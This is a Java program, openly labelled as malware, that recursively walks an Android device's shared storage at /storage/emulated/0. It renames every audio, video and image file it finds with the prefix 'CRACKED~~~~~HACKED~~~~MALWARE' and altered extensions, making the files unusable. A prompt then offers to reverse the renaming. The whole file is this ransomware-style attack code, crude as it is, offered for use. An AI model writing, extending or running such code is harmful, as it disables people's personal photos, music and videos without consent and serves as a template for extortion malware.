package hhhh;

import java.io.*;
import java.util.*;
public class hhhh {
    public static void main(String[] args) {
        // Replace "/path/to/your/directory" with the actual path to the root directory
        String rootDirectoryPath = "/storage/emulated/0";
        
        File rootDirectory = new File(rootDirectoryPath);
        traverseDirectory(rootDirectory);
        
        Scanner sc = new Scanner(System.in);
        System.out.print("Want to decode? (Y/N) : ");
        char ans = sc.next().charAt(0);
        if(ans == 'y' || ans == 'Y'){
            File newRoot = new File(rootDirectoryPath);
            System.out.println("called");
            funToDecode(newRoot);
            System.out.println("called");
        }
        
    }
    
    static Queue<String> mp6 = new LinkedList<>();
    
    static Queue<String> mp2 = new LinkedList<>();
    
    
    static int k = 1;
    static String malwareName = "CRACKED~~~~~HACKED~~~~MALWARE";
    
    public static void encode(String filePath, String fileName, String currType, String newExt){
        String Ef = fileName.substring(0, fileName.length()-4);
        String newPath = filePath.substring(0, filePath.length()-fileName.length())+malwareName+Ef+newExt+currType;
        File oldFile = new File(filePath);
        File newFile = new File(newPath);
       // System.out.println(oldFile.renameTo(newFile));
       if(oldFile.renameTo(newFile)){
            System.out.println("Mission Succesful");
        }
        k++;
    }
    
    public static void encodes(String f, String fn){
        if(f.endsWith(".mp3")){
            encode(f, fn, "2", ".zz");
        }
        if(f.endsWith(".mp4")){
            encode(f,fn, "6", ".BY");
        }
        if(f.endsWith(".png") || f.endsWith(".PNG")){
            encode(f, fn, "g", ".zz");
        }
        if(f.endsWith(".jpg") || f.endsWith(".JPG")){
            encode(f, fn, "g", ".yy");
        }
        if(f.endsWith(".jpeg") || f.endsWith(".JPEG")){
            encode(f, fn, "e", ".jj");
        }
    }
    
    public static void decode(String f, String fn, String ext){
        String nF = fn.substring(29, fn.length()-4);
        System.out.println(nF);
        String newPath = f.substring(0, f.length()-fn.length())+nF+ext;
        
        File oldFile = new File(f);
        File newFile = new File(newPath);
        
        if(oldFile.renameTo(newFile)){
            System.out.println("decoded");
        }
    }
    
    public static void decodes(String f, String fn){
        if(fn.endsWith(".zz2")){
            decode(f, fn, ".mp3");
        }
        
        if(fn.endsWith(".BY6")){
            decode(f, fn, ".mp4");
            
        }
        if(fn.endsWith(".zzg")){
            decode(f, fn, ".png");
        }
        if(fn.endsWith(".yyg")){
            decode(f, fn, ".jpg");
        }
        if(fn.endsWith(".jje")){
            decode(f, fn, ".jpeg");
        }
        
    }
    public static void traverseDirectory(File directory) {
        if (directory.isDirectory()) {
            File[] files = directory.listFiles();
            if (files != null) {
                for (File file : files) {
                    String f = file.getAbsolutePath();
                    String fn = file.getName();
                    encodes(f, fn);
                    
                    if (file.isDirectory()) {
                        System.out.println("Directory name: " + file.getName());
                        System.out.println("Directory path: " + file.getAbsolutePath());
                        System.out.println("-------------------------");
                        traverseDirectory(file);// Recursively traverse subdirectories
                    } else {
                        /*System.out.println("File name: " + file.getName());
                        System.out.println("File path: " + file.getAbsolutePath());
                        System.out.println("-------------------------");*/
                    }
                }
            }
        }
    }
    
    
      public static void funToDecode(File directory) {
        if (directory.isDirectory()) {
            File[] files = directory.listFiles();
            if (files != null) {
                for (File file : files) {
                    String f = file.getAbsolutePath();
                    String fn = file.getName();
                    decodes(f, fn);
                    
                    if (file.isDirectory()) {
                        System.out.println("Directory name: " + file.getName());
                        System.out.println("Directory path: " + file.getAbsolutePath());
                        System.out.println("-------------------------");
                        funToDecode(file);// Recursively traverse subdirectories
                    } else {
                        System.out.println("File name: " + file.getName());
                        System.out.println("File path: " + file.getAbsolutePath());
                        System.out.println("-------------------------");
                    }
                }
            }
        }
    }
    
}